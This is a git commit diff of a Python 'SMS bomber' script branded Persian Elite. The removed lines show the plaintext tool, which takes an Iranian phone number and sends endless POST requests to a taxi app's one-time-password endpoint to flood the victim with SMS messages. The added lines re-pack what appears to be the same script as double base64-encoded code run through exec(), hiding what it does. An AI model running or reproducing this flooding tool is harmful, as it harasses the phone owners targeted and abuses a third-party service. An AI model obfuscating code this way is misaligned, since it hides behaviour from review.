86a6b26af8453f21139aa38c8afd27875097e67a
Mehdi4lion <74841880+Mehdi4lion@users.noreply.github.com>
2021-03-31 01:42:59 +0430

    Update Elite-Bomber.py

--- Elite-Bomber.py
+++ Elite-Bomber.py
@@ -1,50 +1,43 @@
-import requests
-import os
-red='\033[31m'
-green='\033[32m'
-blue='\033[36m'
-pink='\033[35m'
-rang='\033[34m'
-link = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
-os.system("for i in {1..12}; do for j in $(seq 1 $i); do echo -ne $iÃ—$j=$((i*j))\\t;done; echo;done")
-os.system("clear")
-print(f"{red} ")
-print("        ,     \    /      , ")
-print("       / \    )\__/(     / \ ")
-print("      /   \  (_\  /_)   /   \ ")
-print(" ____/_____\__\@  @/___/_____\____ ")
-print("|             |\../|              | ")
-print("|              \VV/               | ")
-print("|        Persian Elite  YT        | ")
-print("|_________________________________| ")
-print(" |    /\ /      \\        \ /\    | ")
-print(" |  /   V       ))        V   \  | ")
-print(" |/     °       //        °     \| ")
-print(" °              V                ° ")
-print(f"{pink} ")
-print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
-print(f"{blue} ")
-print("Telegram : @Persian_Elite")
-print("YouTube  : YouTube.com/PersianElite")
-print(f"{pink} ")
-print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
-print(f"{green} ")
-print("|1|EliteBomb")
-print("|2|TestNet")
-print("|3|Exit")
-print(f"{rang} ")
-Elite = int(input("|∆|choose <>> : "))
-if Elite == 1:
-    number = input("please send number {9×××××××} : ")
-    while True:
-              requests.post(link,data={"cellphone":"+98"+number})
-              print("Successfully sended", number)
-elif Elite == 3:
-    os.system("clear")
-    os.system("figlet PersianElite ")
-elif Elite == 2:
-    os.system("clear")
-    os.system("pip install speedtest-cli")
-    os.system("speedtest-cli")
-elif Elite == 4:
-    os.system("telnet towel.blinkenlights.nl")
+import base64
+exec(base64.b64decode('''aW1wb3J0IGJhc2U2NAp4PSgiYVcxd2IzSjBJSEpsY1hWbGMzUnpDbWx0Y0c5eWRDQnZjd3B5WldR
+OUoxd3dNek5iTXpGdEp3cG5jbVZsYmowblhEQXpNMXN6TW0wbkNtSnNkV1U5SjF3d016TmJNelp0
+Sndwd2FXNXJQU2RjTURNeld6TTFiU2NLY21GdVp6MG5YREF6TTFzek5HMG5DbXhwYm1zZ1BTQWlh
+SFIwY0hNNkx5OWhjSEF1YzI1aGNIQXVkR0Y0YVM5aGNHa3ZZWEJwTFhCaGMzTmxibWRsY2kxdllY
+VjBhQzkyTWk5dmRIQWlDbTl6TG5ONWMzUmxiU2dpWm05eUlHa2dhVzRnZXpFdUxqRXlmVHNnWkc4
+Z1ptOXlJR29nYVc0Z0pDaHpaWEVnTVNBa2FTazdJR1J2SUdWamFHOGdMVzVsSUNScHc0UGlnSlFr
+YWowa0tDaHBLbW9wS1Z4Y2REdGtiMjVsT3lCbFkyaHZPMlJ2Ym1VaUtRcHZjeTV6ZVhOMFpXMG9J
+bU5zWldGeUlpa0tjSEpwYm5Rb1ppSjdjbVZrZlNBaUtRcHdjbWx1ZENnaUlDQWdJQ0FnSUNBc0lD
+QWdJQ0JjSUNBZ0lDOGdJQ0FnSUNBc0lDSXBDbkJ5YVc1MEtDSWdJQ0FnSUNBZ0x5QmNJQ0FnSUNs
+Y1gxOHZLQ0FnSUNBZ0x5QmNJQ0lwQ25CeWFXNTBLQ0lnSUNBZ0lDQXZJQ0FnWENBZ0tGOWNJQ0F2
+WHlrZ0lDQXZJQ0FnWENBaUtRcHdjbWx1ZENnaUlGOWZYMTh2WDE5ZlgxOWNYMTljUUNBZ1FDOWZY
+MTh2WDE5ZlgxOWNYMTlmWHlBaUtRcHdjbWx1ZENnaWZDQWdJQ0FnSUNBZ0lDQWdJQ0I4WEM0dUwz
+d2dJQ0FnSUNBZ0lDQWdJQ0FnSUh3Z0lpa0tjSEpwYm5Rb0lud2dJQ0FnSUNBZ0lDQWdJQ0FnSUZ4
+V1ZpOGdJQ0FnSUNBZ0lDQWdJQ0FnSUNCOElDSXBDbkJ5YVc1MEtDSjhJQ0FnSUNBZ0lDQlFaWEp6
+YVdGdUlFVnNhWFJsSUNCWlZDQWdJQ0FnSUNBZ2ZDQWlLUXB3Y21sdWRDZ2lmRjlmWDE5ZlgxOWZY
+MTlmWDE5ZlgxOWZYMTlmWDE5ZlgxOWZYMTlmWDE5Zlgzd2dJaWtLY0hKcGJuUW9JaUI4SUNBZ0lD
+OWNJQzhnSUNBZ0lDQmNYQ0FnSUNBZ0lDQWdYQ0F2WENBZ0lDQjhJQ0lwQ25CeWFXNTBLQ0lnZkNB
+Z0x5QWdJRllnSUNBZ0lDQWdLU2tnSUNBZ0lDQWdJRllnSUNCY0lDQjhJQ0lwQ25CeWFXNTBLQ0ln
+ZkM4Z0lDQWdJTUt3SUNBZ0lDQWdJQzh2SUNBZ0lDQWdJQ0RDc0NBZ0lDQWdYSHdnSWlrS2NISnBi
+blFvSWlEQ3NDQWdJQ0FnSUNBZ0lDQWdJQ0FnVmlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0RDc0NBaUtR
+cHdjbWx1ZENobUludHdhVzVyZlNBaUtRcHdjbWx1ZENnaTRvaUd6cURPb002Z3pxRE9vTTZnenFE
+T29NNmd6cURPb002Z3pxRE9vTTZnenFET29NNmd6cURPb002Z3pxRE9vTTZnenFET29NNmd6cURP
+b002Z3pxRE9vTTZnNG9pR0lpa0tjSEpwYm5Rb1ppSjdZbXgxWlgwZ0lpa0tjSEpwYm5Rb0lsUmxi
+R1ZuY21GdElEb2dRRkJsY25OcFlXNWZSV3hwZEdVaUtRcHdjbWx1ZENnaVdXOTFWSFZpWlNBZ09p
+QlpiM1ZVZFdKbExtTnZiUzlRWlhKemFXRnVSV3hwZEdVaUtRcHdjbWx1ZENobUludHdhVzVyZlNB
+aUtRcHdjbWx1ZENnaTRvaUd6cURPb002Z3pxRE9vTTZnenFET29NNmd6cURPb002Z3pxRE9vTTZn
+enFET29NNmd6cURPb002Z3pxRE9vTTZnenFET29NNmd6cURPb002Z3pxRE9vTTZnNG9pR0lpa0tj
+SEpwYm5Rb1ppSjdaM0psWlc1OUlDSXBDbkJ5YVc1MEtDSjhNWHhGYkdsMFpVSnZiV0lpS1Fwd2Nt
+bHVkQ2dpZkRKOFZHVnpkRTVsZENJcENuQnlhVzUwS0NKOE0zeEZlR2wwSWlrS2NISnBiblFvWmlK
+N2NtRnVaMzBnSWlrS1JXeHBkR1VnUFNCcGJuUW9hVzV3ZFhRb0luemlpSVo4WTJodmIzTmxJRHcr
+UGlBNklDSXBLUXBwWmlCRmJHbDBaU0E5UFNBeE9nb2dJQ0FnYm5WdFltVnlJRDBnYVc1d2RYUW9J
+bkJzWldGelpTQnpaVzVrSUc1MWJXSmxjaUI3T2NPWHc1ZkRsOE9YdzVmRGw4T1hmU0E2SUNJcENp
+QWdJQ0IzYUdsc1pTQlVjblZsT2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJSEpsY1hWbGMzUnpMbkJ2YzNR
+b2JHbHVheXhrWVhSaFBYc2lZMlZzYkhCb2IyNWxJam9pS3prNElpdHVkVzFpWlhKOUtRb2dJQ0Fn
+SUNBZ0lDQWdJQ0FnSUhCeWFXNTBLQ0pUZFdOalpYTnpablZzYkhrZ2MyVnVaR1ZrSWl3Z2JuVnRZ
+bVZ5S1FwbGJHbG1JRVZzYVhSbElEMDlJRE02Q2lBZ0lDQnZjeTV6ZVhOMFpXMG9JbU5zWldGeUlp
+a0tJQ0FnSUc5ekxuTjVjM1JsYlNnaVptbG5iR1YwSUZCbGNuTnBZVzVGYkdsMFpTQWlLUXBsYkds
+bUlFVnNhWFJsSUQwOUlESTZDaUFnSUNCdmN5NXplWE4wWlcwb0ltTnNaV0Z5SWlrS0lDQWdJRzl6
+TG5ONWMzUmxiU2dpY0dsd0lHbHVjM1JoYkd3Z2MzQmxaV1IwWlhOMExXTnNhU0lwQ2lBZ0lDQnZj
+eTV6ZVhOMFpXMG9Jbk53WldWa2RHVnpkQzFqYkdraUtRcGxiR2xtSUVWc2FYUmxJRDA5SURRNkNp
+QWdJQ0J2Y3k1emVYTjBaVzBvSW5SbGJHNWxkQ0IwYjNkbGJDNWliR2x1YTJWdWJHbG5hSFJ6TG01
+c0lpa0siKQpleGVjKGJhc2U2NC5iNjRkZWNvZGUoeCkpCg=='''))
